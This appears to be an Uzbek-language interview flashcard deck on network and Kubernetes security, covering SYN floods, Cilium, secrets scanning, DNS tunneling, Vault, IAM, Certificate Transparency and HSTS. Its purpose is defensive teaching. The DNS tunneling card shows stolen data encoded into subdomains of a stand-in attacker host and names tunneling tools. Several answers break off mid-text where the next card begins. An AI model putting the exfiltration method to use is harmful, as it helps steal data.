Interview Drill::Networking::H30 K8s security & zero trust	idrill-41914	<p>TCP SYN flood'ni kernel va load balancer darajasida qanday kamaytirasiz?</p>	<p><b>Qisqa javob:</b> SYN flood — hujumchi millionlab <code>SYN</code> yuboradi, lekin handshake'ni tugatmaydi. Server har biri uchun SYN queue'da joy band qiladi, navbat to'ladi va haqiqiy foydalanuvchilar ulana olmaydi. Himoya ikki darajada: <b>kernel</b>da (SYN cookies — navbatsiz ishlash) va <b>edge</b>da (hujum serverga yetmasdan yutiladi).</p><h4>Mexanizm</h4><pre>Hujumchi: SYN (soxta IP) -&gt; server SYN-ACK yuboradi, ACK kutadi (SYN_RECV, ~60s retry)<br>          SYN, SYN, SYN ... -&gt; SYN queue to'ladi -&gt; haqiqiy SYN'lar tashlanadi</pre><p>Belgilar:</p><pre>ss -tan state syn-recv | wc -l          # minglab<br>nstat -az | grep -E 'TcpExtListenDrops|SyncookiesSent'<br>dmesg | grep 'SYN flooding'             # &quot;Possible SYN flooding on port 443. Sending cookies.&quot;</pre><h4>Kernel darajasi</h4><pre># /etc/sysctl.d/90-synflood.conf<br>net.ipv4.tcp_syncookies = 1         # navbat to'lsa cookie rejimi<br>net.ipv4.tcp_max_syn_backlog = 8192 # kattaroq SYN queue<br>net.core.somaxconn = 8192<br>net.ipv4.tcp_synack_retries = 2     # SYN-ACK'ni kamroq qayta yuborish (default 5, ~3 daqiqa)</pre><p><b>SYN cookies</b> qanday ishlaydi: navbat to'lganda server SYN uchun joy band <b>qilmaydi</b>. Ulanish ma'lumotini (port, MSS, vaqt) kriptografik hash qilib SYN-ACK'ning sequence raqamiga joylaydi. Haqiqiy client ACK qaytarsa — raqamdan ma'lumot tiklanadi va ulanish yaratiladi. Soxta SYN'lar xotira egallamaydi. Kamchilik: ba'zi TCP opsiyalari (window scaling) cheklanadi — shuning uchun faqat navbat to'lganda yoqiladi.</p><p><b>Muhim:</b> kernel tuning faqat <b>server resurslarini</b> himoya qiladi. Hujum kanalni (masalan 10 Gbit uplink) to'ldirsa — server hech narsa qila olmaydi.</p><h4>Edge darajasi</h4><ul><li><b>Anycast CDN/DDoS himoyasi</b> (Cloudflare, AWS Shield + CloudFront/Global Accelerator): hujum yuzlab edge nuqtalarga taqsimlanadi va u yerda yutiladi. Terabit hajmli hujumlarga yagona real yechim.</li><li><b>SYN proxy</b>: load balancer handshake'ni o'zi tugatadi, faqat to'liq ulanishlarni backend'ga uzatadi (AWS NLB/ALB, Shield Advanced).</li><li><b>Origin yashirish</b>: backend faqat CDN IP'laridan trafik qabul qiladi — hujumchi origin'ni to'g'ridan-to'g'ri ura olmaydi.</li><li><b>iptables/nftables</b> rate limit (<code>limit</code>, <code>hashlimit</code>) yoki <b>XDP/eBPF</b> filtr — paketlarni driver darajasida, juda arzon tashlash (o'rta hajmli hujumlar uchun).</li></ul><p><b>Senior nuqta:</b> Hujum vaqtida emas, oldindan tayyorlaning: DDoS provayder bilan shartnoma, runbook, origin IP'lari oshkor bo'lmaganligi (eski DNS yozuvlari, e-mail header'lari orqali sizib chiqadi). Kernel sozlamalari — oxirgi chiziq, asosiy himoya emas.</p>	lvl::Senior dom::net sec::h30 K8s_security_zero_trust
Interview Drill::Networking::H30 K8s security & zero trust	idrill-41915	<p>Kubernetes'da Cilium va WireGuard bilan zero-trust microsegmentation qanday qilinadi?</p>	<p><b>Qisqa javob:</b> Zero-trust microsegmentation — har pod faqat <b>aniq ruxsat berilgan</b> pod'lar bilan gaplasha oladi (default deny), va barcha trafik <b>shifrlanadi</b>, hatto klaster ichida ham. Cilium buni eBPF orqali kernel ichida, sidecar'siz qiladi: identity asosidagi L3/L4/L7 policy va WireGuard shifrlash.</p><h4>Nega kerak</h4><p>Default K8s'da har pod har pod bilan gaplasha oladi. Bitta buzilgan pod (masalan frontend) to'g'ridan-to'g'ri DB'ga yoki boshqa jamoaning servislariga ulanadi — lateral movement. Ichki trafik esa ochiq matn — node'dagi hujumchi uni o'qiydi.</p><h4>Cilium qanday ishlaydi</h4><ul><li>Har pod label'lari asosida <b>security identity</b> (raqam) oladi. Policy IP bo'yicha emas, identity bo'yicha — pod qayta yaratilib IP o'zgarsa ham policy ishlaydi.</li><li>eBPF dasturlari har paketni kernel'da tekshiradi — iptables zanjirlaridan tez.</li><li>L7 qoidalar (HTTP method/path, gRPC, Kafka topic) uchun node'dagi Envoy proxy.</li></ul><h4>1. Default deny</h4><pre>apiVersion: cilium.io/v2<br>kind: CiliumNetworkPolicy<br>metadata: { name: default-deny, namespace: payments }<br>spec:<br>  endpointSelector: {}<br>  ingress: [{}]       # bo'sh qoida = hech narsa ruxsat emas<br>  egress:<br>  - toEndpoints:<br>    - matchLabels: { &quot;k8s:io.kubernetes.pod.namespace&quot;: kube-system, k8s-app: kube-dns }<br>    toPorts: [{ ports: [{ port: &quot;53&quot;, protocol: UDP }] }]   # DNS'ga ruxsat, aks holda hech narsa ishlamaydi</pre><h4>2. Aniq ruxsatlar (L7 bilan)</h4><pre>apiVersion: cilium.io/v2<br>kind: CiliumNetworkPolicy<br>metadata: { name: api-to-payments, namespace: payments }<br>spec:<br>  endpointSelector: { matchLabels: { app: payments } }<br>  ingress:<br>  - fromEndpoints:<br>    - matchLabels: { app: api, &quot;k8s:io.kubernetes.pod.namespace&quot;: api }<br>    toPorts:<br>    - ports: [{ port: &quot;8080&quot;, protocol: TCP }]<br>      rules:<br>        http:<br>        - method: POST<br>          path: &quot;/v1/charge&quot;</pre><p><code>api</code> faqat <code>POST /v1/charge</code> chaqira oladi; <code>GET /admin</code> — rad.</p><h4>3. WireGuard shifrlash</h4><pre># Helm values<br>encryption:<br>  enabled: true<br>  type: wireguard<br>  nodeEncryption: true     # node-node trafigi ham</pre><p>Har node WireGuard kalit juftligiga ega, node'lar orasidagi pod trafigi kernel'da avtomatik shifrlanadi. Ilova va sidecar o'zgarishi yo'q.</p><pre>cilium encrypt status</pre><h4>4. Kuzatish — Hubble</h4><pre>hubble observe --namespace payments --verdict DROPPED</pre><p>Qaysi ulanish rad etilgani — policy yozish va debug uchun asosiy vosita. Avval <b>audit rejimi</b> (<code>policyAuditMode</code>)da qaysi trafik bloklanishini ko'rib, keyin enforce.</p><h4>Service mesh mTLS'dan farqi</h4><p>WireGuard <b>node</b> darajasida shifrlaydi; identity — Cilium identity. Istio mTLS esa har <b>workload</b>ga X.509 sertifikat beradi (kuchliroq kriptografik identity). Cilium'da ham mutual authentication (SPIFFE) imkoniyati bor.</p><p><b>Senior nuqta:</b> Default deny'ni mavjud klasterga birdan yoqish — avariya. Interview Drill::Networking::H30 K8s security & zero trust	idrill-41917	<p>Secrets sprawl nima va enterprise tuzatish pipeline'ini qanday loyihalaysiz?</p>	<p><b>Qisqa javob:</b> Secrets sprawl — parol, API kalit va token'lar nazoratsiz joylarga tarqalib ketishi: Git tarixi, config fayllar, CI o'zgaruvchilari, Slack, wiki, noutbuklar. Ularni hech kim kuzatmaydi va rotatsiya qilmaydi. Yechim — <b>to'rt qatlam</b>: yangi sizishning oldini olish, mavjudlarini topish, topilganini tez bekor qilish va ildiz sababni yo'qotish (markaziy vault, dynamic credential'lar).</p><h4>Nega xavfli</h4><ul><li>Git'dagi kalit — fork, klon, backup'larda abadiy. Commit o'chirilsa ham tarixda qoladi.</li><li>Ochiq repo'dagi AWS kalitlarni botlar <b>daqiqalar</b> ichida topadi.</li><li>Kim foydalanayotganini bilmasangiz — rotatsiya qilishdan qo'rqasiz.</li></ul><h4>1. Oldini olish (shift-left)</h4><ul><li><b>Pre-commit hook</b> — dasturchi kompyuterida:</li></ul><pre># .pre-commit-config.yaml<br>repos:<br>- repo: https://github.com/gitleaks/gitleaks<br>  rev: v8.21.0<br>  hooks: [{ id: gitleaks }]</pre><ul><li><b>Push protection</b> — GitHub Secret Scanning ma'lum formatdagi kalitlarni push'da bloklaydi (hook o'rnatilmagan bo'lsa ham).</li><li><b>CI tekshiruvi</b> — PR'da gitleaks/trufflehog, topilsa merge yo'q.</li></ul><h4>2. Aniqlash (mavjud tarqalganlar)</h4><ul><li>Butun org bo'yicha rejali skan, <b>to'liq tarix</b> bilan:</li></ul><pre>trufflehog github --org=myorg --only-verified</pre><p><code>--only-verified</code> — kalit haqiqatan <b>ishlaydimi</b> tekshiradi, yolg'on signallar kam.</p><ul><li>Boshqa joylar: CI log'lari, container image qatlamlari (<code>trufflehog docker</code>), S3, Slack/Confluence.</li></ul><h4>3. Javob — avtomatik</h4><p>Topildi -&gt; darhol:</p><ol><li><b>Bekor qilish/rotatsiya</b> (o'chirish emas — u allaqachon sizgan).</li><li>Egasiga xabar, ticket.</li><li>Kalit ishlatilgan log'larni tekshirish (CloudTrail) — kimdir foydalanganmi.</li></ol><p>Avtomatlashtirish: webhook -&gt; Lambda -&gt; AWS kalitni deaktivatsiya — daqiqalar ichida. AWS ochiq GitHub'da topilgan kalitlarga avtomatik <code>AWSCompromisedKeyQuarantine</code> policy qo'yadi.</p><p>Git tarixidan tozalash (<code>git filter-repo</code>) — ikkinchi darajali; asosiysi rotatsiya.</p><h4>4. Ildiz sababni yo'qotish</h4><ul><li><b>Markaziy saqlash</b>: Vault, AWS Secrets Manager — kod faqat havola saqlaydi.</li><li><b>Statik secret'larni yo'qotish</b>:</li><li>CI -&gt; cloud: <b>OIDC</b> federatsiya (GitHub Actions -&gt; AWS role), kalit yo'q.</li><li>Pod -&gt; cloud: IRSA / Workload Identity.</li><li>Ilova -&gt; DB: Vault dynamic credential'lar.</li><li>Qisqa umr: qolgan secret'lar avtomatik rotatsiya.</li></ul><h4>O'lchash</h4><ul><li>Ochiq topilmalar soni va ularni yopish vaqti (MTTR).</li><li>Statik uzoq muddatli kalitlar soni (kamayishi kerak).</li><li>Push protection bloklagan urinishlar.</li></ul><p><b>Senior nuqta:</b> Eng yaxshi secret — <b>yo'q</b> secret. Skanerlar sizishni topadi, lekin muammoni hal qilmaydi; OIDC va workload identity bilan statik kalitlarni yo'qotish sprawl'ni ildizdan kesadi.</p>	lvl::Senior dom::net sec::h30 K8s_security_zero_trust
Interview Drill::Networking::H30 K8s security & zero trust	idrill-41918	<p>DNS tunneling / exfiltration nima va qanday bloklanadi?</p>	<p><b>Qisqa javob:</b> DNS tunneling — ma'lumotni <b>DNS so'rovlari ichida</b> yashirib yuborish. Zararli dastur o'g'irlangan ma'lumotni subdomen nomiga kodlaydi (<code>c2VjcmV0.evil.com</code>) va so'raydi; so'rov rekursiv resolver orqali hujumchining serveriga yetadi. Firewall HTTP'ni bloklasa ham, DNS deyarli doim ochiq — shuning uchun bu sevimli chiqish yo'li. Himoya: DNS'ni faqat <b>nazorat qilinadigan resolver</b> orqali o'tkazish, domenlarni <b>filtrlash</b> va <b>anomaliyalarni</b> aniqlash.</p><h4>Qanday ishlaydi</h4><pre>Buzilgan server: &quot;parol123&quot; -&gt; base32 -&gt; &quot;obqxg43xn5zgiyzr&quot;<br>  so'rov: obqxg43xn5zgiyzr.x1.evil.com  (TXT)<br>     |<br>  ichki resolver -&gt; internet -&gt; evil.com authoritative server (hujumchiniki)<br>     |<br>  javob TXT ichida buyruq qaytadi (C2 kanal)</pre><p>Har so'rovda ~100–200 bayt; sekin, lekin parollar, kalitlar uchun yetarli. <code>iodine</code>, <code>dnscat2</code> — tayyor vositalar.</p><h4>Aniqlash belgilari</h4><ul><li>Bitta domenga juda ko'p <b>noyob subdomen</b> so'rovlari.</li><li>Uzun, <b>yuqori entropiyali</b> (tasodifiy ko'rinadigan) label'lar.</li><li>G'ayrioddiy turlar ko'p: <code>TXT</code>, <code>NULL</code>, <code>CNAME</code> (oddiy trafik asosan <code>A</code>/<code>AAAA</code>).</li><li>Yangi ro'yxatdan o'tgan domenlar.</li><li>Bitta xostdan doimiy, bir maromdagi DNS trafigi (beacon).</li></ul><h4>Himoya</h4><p><b>1. DNS chiqishini yopish</b> Faqat ichki resolver'lar tashqariga 53-port orqali chiqadi. Boshqa xostlardan to'g'ridan-to'g'ri 53 (UDP/TCP) egress — bloklangan. Aks holda zararli dastur <code>8.8.8.8</code> ga to'g'ridan-to'g'ri so'raydi va nazoratni chetlab o'tadi. DoH (DNS over HTTPS, 443-port) ham — ma'lum DoH provayderlarini bloklash.</p><p><b>2. DNS firewall</b></p><ul><li>AWS: <b>Route 53 Resolver DNS Firewall</b> — boshqariladigan zararli domen ro'yxatlari, allowlist/denylist.</li><li>Kubernetes: CoreDNS + NetworkPolicy, pod'lar faqat CoreDNS'ga.</li><li>Qat'iy muhitlarda (PCI): <b>allowlist</b> — faqat ma'lum domenlar hal qilinadi.</li></ul><p><b>3. Log va tahlil</b></p><ul><li>Resolver query log'lari (Route 53 Resolver Query Logging) -&gt; SIEM.</li><li>Qoidalar: label uzunligi &gt; 50, entropiya yuqori, domen bo'yicha noyob subdomenlar soni, TXT ulushi.</li><li>AWS GuardDuty DNS log'larni tahlil qilib, DNS exfiltration va C2 domenlarni aniqlaydi.</li></ul><p><b>4. Javob</b> Xostni izolyatsiya qilish, domenni bloklash, qaysi ma'lumot ketganini baholash.</p><p><b>Senior nuqta:</b> DNS'ni &quot;infra servis&quot; deb e'tiborsiz qoldirish keng tarqalgan xato — u ham chiqish kanali. Zero-trust egress (default deny + allowlist) bo'lsa, DNS tunneling ham, oddiy HTTP exfiltration ham keskin qiyinlashadi.</p>	lvl::Senior dom::net sec::h30 K8s_security_zero_trust
Interview Drill::Networking::H30 K8s security & zero trust	idrill-41919	<p>Ssenariy: turli AWS VPC'lardagi ikki Kubernetes klasterini public internetsiz xavfsiz qanday ulaysiz?</p>	<p><b>Qisqa javob:</b> Uch qatlam kerak: <b>tarmoq ulanishi</b> (VPC'lar xususiy yo'l bilan bog'lanadi — Transit Gateway yoki peering), <b>K8s darajasidagi ulanish</b> (bir klaster pod/servisi ikkinchisini topa olsin — Cilium Cluster Mesh, Submariner yoki mesh), va <b>xavfsizlik</b> (mTLS identity va policy). Interview Drill::Networking::H30 K8s security & zero trust	idrill-41920	<p>Pod Security Standards (Privileged, Baseline, Restricted) farqi.</p>	<p><b>Qisqa javob:</b> Pod Security Standards — pod'larga qo'yiladigan uchta tayyor xavfsizlik darajasi. <b>Privileged</b> — hech qanday cheklov yo'q (tizim komponentlari uchun). <b>Baseline</b> — ma'lum xavfli narsalar (privileged, host namespace'lari) taqiqlangan, oddiy ilovalar o'zgarishsiz ishlaydi. <b>Restricted</b> — eng qat'iy: root emas, capability'lar yo'q, seccomp majburiy. Ular <b>Pod Security Admission</b> (PSA) orqali namespace label'lari bilan qo'llanadi.</p><h4>Darajalar</h4><p>| Narsa | Privileged | Baseline | Restricted | |---|---|---|---| | <code>privileged: true</code> | ✔ | ✘ | ✘ | | <code>hostNetwork/hostPID/hostIPC</code> | ✔ | ✘ | ✘ | | <code>hostPath</code> volume | ✔ | ✘ | ✘ | | Xavfli capability'lar (<code>SYS_ADMIN</code>) | ✔ | ✘ | ✘ | | Root sifatida ishlash | ✔ | ✔ | ✘ (<code>runAsNonRoot</code>) | | <code>allowPrivilegeEscalation</code> | ✔ | ✔ | ✘ (false shart) | | Capability'lar | hammasi | default to'plam | <code>drop: ALL</code> (faqat <code>NET_BIND_SERVICE</code> qo'shish mumkin) | | Seccomp | ixtiyoriy | ixtiyoriy | <code>RuntimeDefault</code> shart | | Volume turlari | hammasi | hostPath'dan boshqa | faqat xavfsiz turlar |</p><h4>Qachon qaysi</h4><ul><li><b>Privileged</b> — <code>kube-system</code>, CNI, CSI, monitoring agent'lari (host'ga kirish kerak).</li><li><b>Baseline</b> — eski ilovalar uchun minimal standart.</li><li><b>Restricted</b> — yangi ilovalar uchun maqsad.</li></ul><h4>PSA bilan qo'llash</h4><pre>apiVersion: v1<br>kind: Namespace<br>metadata:<br>  name: payments<br>  labels:<br>    pod-security.kubernetes.io/enforce: restricted   # buzsa — pod rad etiladi<br>    pod-security.kubernetes.io/warn: restricted      # kubectl ogohlantirish<br>    pod-security.kubernetes.io/audit: restricted     # audit log'ga</pre><p>Uch rejim birgalikda — xavfsiz joriy qilish: avval <code>warn</code> + <code>audit</code>, muammolar tuzatilgach <code>enforce</code>.</p><p>Sinab ko'rish:</p><pre>kubectl label --dry-run=server --overwrite ns payments pod-security.kubernetes.io/enforce=restricted<br># Warning: existing pods in namespace &quot;payments&quot; violate the new PodSecurity enforce level</pre><h4>Restricted'ga mos pod</h4><pre>securityContext:<br>  runAsNonRoot: true<br>  seccompProfile: { type: RuntimeDefault }<br>containers:<br>- name: app<br>  securityContext:<br>    allowPrivilegeEscalation: false<br>    capabilities: { drop: [&quot;ALL&quot;] }</pre><h4>Cheklovlar</h4><p>PSA faqat shu tayyor qoidalarni tekshiradi. Image manbasi, label'lar, resurs limitlari, imzo kabi maxsus qoidalar uchun Kyverno yoki OPA Gatekeeper kerak. PodSecurityPolicy (PSP) K8s 1.25 da olib tashlangan — PSA uning o'rnini egalladi.</p><p><b>Senior nuqta:</b> Asosiy tuzoq — enforce Deployment emas, <b>pod</b> yaratilishida ishlaydi: Deployment muvaffaqiyatli yaratiladi, lekin ReplicaSet pod yarata olmaydi va xato faqat <code>kubectl describe rs</code> da ko'rinadi. Shuning uchun <code>warn</code> rejimi va CI'da manifest tekshiruvi muhim.</p>	lvl::Senior dom::net sec::h30 K8s_security_zero_trust
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41921	<p>In-toto attestation framework nima?</p>	<p><b>Qisqa javob:</b> in-toto — software supply chain'ning har qadami (source, build, test, package) <b>kim, nima bilan, qanday natija</b> bilan bajarilganini kriptografik imzolangan metadata (attestation) sifatida yozadigan CNCF framework. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41922	<p>Rekor transparency log nima?</p>	<p><b>Qisqa javob:</b> Rekor — Sigstore'ning <b>transparency log</b>'i: imzolar, sertifikatlar va attestation'lar yoziladigan public, append-only, Merkle tree asosidagi ledger. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41923	<p>Fulcio CA nima?</p>	<p><b>Qisqa javob:</b> Fulcio — Sigstore'ning bepul public CA'si. U OIDC token (Google, GitHub Actions, Microsoft) bilan kimligingizni tasdiqlaydi va shu identity'ga bog'langan <b>~10 daqiqa</b> amal qiladigan X.509 code-signing sertifikat beradi. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41924	<p>Vault'da Shamir's Secret Sharing nima?</p>	<p><b>Qisqa javob:</b> Shamir's Secret Sharing — Vault'ning root (unseal) kalitini N ta ulushga bo'lib, faqat <b>istalgan M tasi</b> (threshold) birlashsa kalit tiklanadigan algoritm. Default: 5 ulush, 3 tasi kerak. Bitta odam yolg'iz Vault'ni ocha olmaydi.</p><p><b>Muammo:</b> Vault barcha secret'larni encryption key bilan shifrlaydi, u esa root key bilan himoyalangan. Agar root key bitta adminda bo'lsa — u ketishi, kasal bo'lishi yoki buzilishi butun tizimni xavfga qo'yadi.</p><p><b>Qanday ishlaydi:</b></p><pre>Matematika: (M-1) darajali polinom, f(0) = secret<br>   f(x) = secret + a1*x + a2*x^2     (M=3)<br>   ulushlar: (1,f(1)) (2,f(2)) ... (5,f(5))<br>   istalgan 3 nuqta -&gt; polinom tiklanadi -&gt; f(0)<br>   2 nuqta -&gt; secret haqida HECH qanday ma'lumot yo'q<br><br>Vault ichida:<br>  unseal key ulushlari -&gt; root key -&gt; keyring (encryption keys) -&gt; storage</pre><p><b>Amalda:</b></p><pre>vault operator init -key-shares=5 -key-threshold=3 \<br>  -pgp-keys=&quot;alice.asc,bob.asc,carol.asc,dan.asc,eve.asc&quot;<br># har ulush egasining PGP kaliti bilan shifrlangan holda chiqadi<br>vault operator unseal   # 3 xil odam navbat bilan o'z ulushini kiritadi<br>vault status            # Sealed: false, Unseal Progress 3/3<br>vault operator rekey -init -key-shares=5 -key-threshold=3   # ulushlarni almashtirish</pre><p><b>Tuzoqlar:</b></p><ul><li>Init chiqishini (ulushlar + root token) bitta terminal log'ida yoki Slack'da qoldirish — butun sxemani yo'q qiladi. <code>-pgp-keys</code> ishlating.</li><li>Root token'ni init'dan keyin revoke qiling, kerak bo'lsa <code>generate-root</code> bilan qayta yarating.</li><li>Threshold = shares (5/5) — bitta ulush yo'qolsa Vault abadiy qulflanadi.</li></ul><p><b>Senior nuqta:</b> Production'da manual unseal kam qo'llanadi (auto-unseal), lekin Shamir g'oyasi recovery key'larda qoladi. Ulush egalarini turli jamoa/geografiyaga taqsimlang va yiliga bir marta unseal/rekey mashqi o'tkazing.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41925	<p>Vault auto-unseal nima?</p>	<p><b>Qisqa javob:</b> Auto-unseal — Vault root key'ini Shamir ulushlari o'rniga tashqi <b>cloud KMS</b> (AWS KMS, Azure Key Vault, GCP KMS) yoki <b>HSM</b> bilan shifrlab saqlash. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41926	<p>Kubernetes KMS v2 provider nima?</p>	<p><b>Qisqa javob:</b> KMS v2 — Kubernetes API server etcd'ga yoziladigan Secret'larni tashqi KMS (AWS KMS, Vault, Azure Key Vault) bilan <b>envelope encryption</b> orqali shifrlash API'si. v1'dan farqi: DEK qayta ishlatiladi va cache'lanadi — har yozishda KMS'ga borilmaydi. Kubernetes 1.29 da GA; v1 deprecated.</p><p><b>Muammo:</b> Default holatda Secret'lar etcd'da faqat base64 — etcd backup yoki disk o'g'irlansa, barcha parollar ochiq. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41927	<p>IAM session policy (xavfsizlik kontekstida) nima?</p>	<p><b>Qisqa javob:</b> Session policy — <code>sts:AssumeRole</code> (yoki <code>AssumeRoleWithWebIdentity</code>, <code>GetFederationToken</code>) chaqirilganda inline beriladigan policy. Natijaviy ruxsat = <b>role policy ∩ session policy</b> — u faqat toraytiradi, hech qachon kengaytirmaydi.</p><p><b>Muammo:</b> Bitta umumiy <code>data-processor</code> role'i 200 ta bucket'ga kira oladi. Har bir job uchun alohida role yaratish — role soni portlaydi. Lekin har job faqat o'z tenant bucket'iga kirishi kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>Role policy:     s3:* on arn:aws:s3:::tenant-*<br>Session policy:  s3:GetObject on arn:aws:s3:::tenant-42/*<br>                 -------------------------------------------<br>Effektiv:        s3:GetObject faqat tenant-42/*<br>(Permission boundary va SCP ham kesishmaga qo'shiladi)</pre><p><b>Amalda:</b></p><pre>aws sts assume-role \<br>  --role-arn arn:aws:iam::111122223333:role/data-processor \<br>  --role-session-name job-42 \<br>  --policy '{&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;:[{&quot;Effect&quot;:&quot;Allow&quot;,<br>    &quot;Action&quot;:&quot;s3:GetObject&quot;,&quot;Resource&quot;:&quot;arn:aws:s3:::tenant-42/*&quot;}]}' \<br>  --duration-seconds 900</pre><p>Managed policy bilan: <code>--policy-arns arn=arn:aws:iam::aws:policy/ReadOnlyAccess</code>. Tekshirish: shu credential bilan <code>aws s3 ls s3://tenant-7</code> -&gt; <code>AccessDenied</code>.</p><p><b>Tuzoqlar:</b></p><ul><li>Session policy'da ruxsat berish role'da bo'lmagan action'ni ochmaydi — &quot;nega ishlamayapti&quot; chalkashligi.</li><li>Inline session policy hajmi cheklangan (packed size ~2048 belgi) — ko'p resursda <code>PackedPolicyTooLarge</code>.</li><li>Resource-based policy (bucket policy) to'g'ridan-to'g'ri session ARN'ga ruxsat bersa, session policy cheklovi kutganingizdek ishlamasligi mumkin.</li></ul><p><b>Senior nuqta:</b> Multi-tenant SaaS'da session policy + session tag'lar (ABAC) — tenant izolyatsiyasining arzon va kuchli usuli. Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41928	<p>Cloud IAM'da confused deputy muammosi nima?</p>	<p><b>Qisqa javob:</b> Confused deputy — huquqi yo'q tomon huquqli servisni (deputy) <b>o'zi uchun</b> harakat qilishga majburlashi. IAM Access Analyzer tashqi trust'larni avtomatik topadi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41929	<p>Certificate Transparency (CT) nima?</p>	<p><b>Qisqa javob:</b> Certificate Transparency (CT) — barcha public TLS sertifikatlar yoziladigan ochiq, append-only (Merkle tree) log'lar tizimi (RFC 6962). Brauzerlar (Chrome, Safari) log'ga yozilmagan sertifikatni qabul qilmaydi, shu sabab CA yashirincha soxta sertifikat chiqara olmaydi.</p><p><b>Muammo:</b> 2011 DigiNotar buzildi — google.com uchun soxta sertifikat chiqarilib, Eronda MitM qilindi. Hech kim bilmagan, chunki sertifikat chiqarilishi ko'rinmas edi.</p><p><b>Qanday ishlaydi:</b></p><pre>CA -&gt; precertificate -&gt; CT log'lar (2-3 ta) -&gt; SCT (signed timestamp)<br>CA -&gt; SCT'ni sertifikat ichiga qo'yadi -&gt; server'ga beradi<br>Brauzer: SCT bormi va ishonchli log'lardanmi? yo'q -&gt; rad<br>Monitor'lar (crt.sh, Cert Spotter): log'larni o'qib, domen egasiga xabar</pre><p><b>Amalda:</b></p><pre># domeningiz uchun chiqarilgan barcha sertifikatlar<br>curl -s 'https://crt.sh/?q=%25.example.com&amp;output=json' | jq -r '.[].name_value' | sort -u<br># sertifikatdagi SCT'larni ko'rish<br>openssl s_client -connect example.com:443 &lt;/dev/null 2&gt;/dev/null \<br> | openssl x509 -noout -text | grep -A3 'CT Precertificate SCTs'</pre><p>CAA DNS yozuvi bilan birga ishlating:</p><pre>example.com. CAA 0 issue &quot;letsencrypt.org&quot;</pre><p><b>Tuzoqlar:</b></p><ul><li>CT log'lar <b>ommaviy</b> — ichki hostname'lar (<code>jenkins.internal.example.com</code>) sertifikati chiqarilsa, hujumchi uchun razvedka manbai. Ichki uchun private CA yoki wildcard.</li><li>CT oldini olmaydi, faqat <b>aniqlaydi</b> — monitoring qilmasangiz foydasi yo'q.</li><li>Phishing domenlar (<code>examp1e.com</code>) ham CT'da ko'rinadi — ularni ham kuzating.</li></ul><p><b>Senior nuqta:</b> Cert Spotter / Facebook CT monitor'ni domenlaringizga ulab, kutilmagan issuer yoki subdomain chiqsa alert oling. Bu bepul va subdomain takeover, shadow IT'ni ham topadi.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41930	<p>OCSP stapling nima?</p>	<p><b>Qisqa javob:</b> OCSP stapling — web server o'z sertifikati holatini (revoke qilinmaganini) CA'ning OCSP responder'idan o'zi oldindan so'rab, imzolangan javobni TLS handshake'ga &quot;qistirib&quot; yuboradi. Client CA'ga alohida so'rov yubormaydi — tezroq va maxfiyroq.</p><p><b>Muammo:</b> Oddiy OCSP'da har brauzer har saytga kirganda CA'ga &quot;bu sertifikat tirikmi?&quot; deb so'raydi: qo'shimcha RTT, CA foydalanuvchi qaysi saytga kirganini biladi (privacy), CA o'chsa brauzer &quot;soft-fail&quot; qilib baribir qabul qiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>Server ---(har necha soatda)---&gt; CA OCSP: status?  &lt;- &quot;good&quot;, imzo, nextUpdate<br>Client --ClientHello (status_request)--&gt; Server<br>Client &lt;--Certificate + CertificateStatus (stapled OCSP)-- Server<br>Client: CA imzosini tekshiradi, CA'ga borilmaydi</pre><p><b>Amalda (nginx):</b></p><pre>ssl_stapling on;<br>ssl_stapling_verify on;<br>ssl_trusted_certificate /etc/ssl/chain.pem;<br>resolver 1.1.1.1 valid=300s;</pre><p>Tekshirish:</p><pre>openssl s_client -connect example.com:443 -status &lt;/dev/null 2&gt;/dev/null | grep -A5 'OCSP Response Status'<br># &quot;OCSP Response Status: successful&quot; va &quot;Cert Status: good&quot;</pre><p><b>Tuzoqlar:</b></p><ul><li>nginx birinchi so'rovda staple qilmaydi (lazy) — restart'dan keyin birinchi client'lar olmaydi.</li><li><b>2025 holati:</b> Let's Encrypt OCSP'ni to'xtatdi (2025-yil may-avgust), endi faqat CRL. Chrome ham OCSP'ni tekshirmaydi (CRLSets). Ya'ni LE sertifikatlarida stapling ishlamaydi.</li><li><code>Must-Staple</code> kengaytmasi bilan staple bo'lmasa sayt ochilmay qoladi — LE uni ham to'xtatdi.</li></ul><p><b>Senior nuqta:</b> Industriya revocation'dan <b>qisqa muddatli sertifikatlar</b>ga (47 kunlik, keyinchalik 6 kunlik) ko'chmoqda. Stapling'ni bilish kerak, lekin yangi dizaynda avtomatik tez rotatsiya muhimroq.</p>	lvl::Senior dom::net sec::h31 DevSecOps_cryptography
Interview Drill::Networking::H31 DevSecOps & cryptography	idrill-41931	<p>HSTS nima?</p>	<p><b>Qisqa javob:</b> HSTS (HTTP Strict Transport Security) — <code>Strict-Transport-Security</code> response header'i. Brauzer uni ko'rgach, belgilangan muddat davomida domenga <b>faqat HTTPS</b> orqali ulanadi: <code>http://</code> linkni o'zi <code>https://</code> ga aylantiradi va sertifikat xatosida &quot;baribir davom etish&quot; tugmasini ko'rsatmaydi.</p><p><b>Muammo:</b> Foydalanuvchi <code>example.com</code> yozadi -&gt; brauzer avval <code>http://</code> ga boradi -&gt; 301 redirect. Shu birinchi ochiq HTTP so'rovni Wi-Fi'dagi hujumchi ushlab, SSL stripping qilishi mumkin.</p><p><b>Qanday ishlaydi:</b></p><pre>1-tashrif: https://example.com -&gt; header: max-age=31536000; includeSubDomains<br>Brauzer xotirasi: &quot;example.com -&gt; faqat HTTPS, 1 yil&quot;<br>Keyingi safar: http://example.com yozilsa -&gt; 307 Internal Redirect (tarmoqqa chiqmasdan)<br>Preload ro'yxati: brauzer ichiga hardcode -&gt; hatto 1-tashrif ham himoyalangan</pre><p><b>Amalda:</b></p><pre>add_header Strict-Transport-Security &quot;max-age=63072000; includeSubDomains; preload&quot; 